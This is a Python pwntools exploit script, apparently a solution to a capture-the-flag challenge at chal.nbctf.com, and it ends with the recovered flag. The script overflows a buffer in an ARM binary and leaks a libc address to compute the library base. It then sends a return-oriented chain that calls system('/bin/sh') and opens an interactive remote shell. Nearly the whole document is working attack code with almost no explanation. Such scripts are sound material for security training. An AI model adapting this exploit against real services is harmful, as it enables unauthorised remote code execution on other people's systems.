from pwn import * 



'''
leak libc address using puts
ret2main
call system("/bin/sh")
'''

#r = process(["qemu-arm","-L", ".", "-g", "4444"  ,"./wmwf"]) # debug with gdb-multiarch --command=remote_script
#r= process(["qemu-arm","-L", "." ,"./wmwf"]) # normal

libc = ELF('lib/libc.so.6')
IO_file_write_offset = libc.symbols['_IO_file_write']

r = remote("chal.nbctf.com",30177)
sleep(2)
r.recv()


padd = b'A'*260
payload = padd
payload += p32(0x103cc)
payload +=p32(0x104b5)*7 # ret 2 main


r.sendline(payload)

padd2 = b'A'*112

leak_IO_file_write = (u32(r.recv().split(padd2)[1][28:32]))
print("leak IO_file_write: ", hex(leak_IO_file_write))
libc_base = leak_IO_file_write - (IO_file_write_offset+18)

libc_pop_r0_pc = libc_base + 0x000e8a69 
libc_system = libc_base + libc.symbols["system"]

binsh_address = libc_base + next(libc.search(b'/bin/sh\x00')) 

mov_r2_r0_pop_r4_r0 = libc_base + 0x000567b3
print("system offset: ", hex(libc.symbols["system"]))
print("libc base : ", hex(libc_base))
print("pop r0,pc: ", hex(libc_pop_r0_pc))
print("system libc: ", hex(libc_system))
print("binsh libc: ", hex(binsh_address))

ropchainf = padd 
ropchainf += p32(libc_pop_r0_pc)
ropchainf += p32(binsh_address)
ropchainf += p32(libc_system)

r.sendline(ropchainf)


r.interactive()


# nbctf{thanks_for_finding_my_win_function!}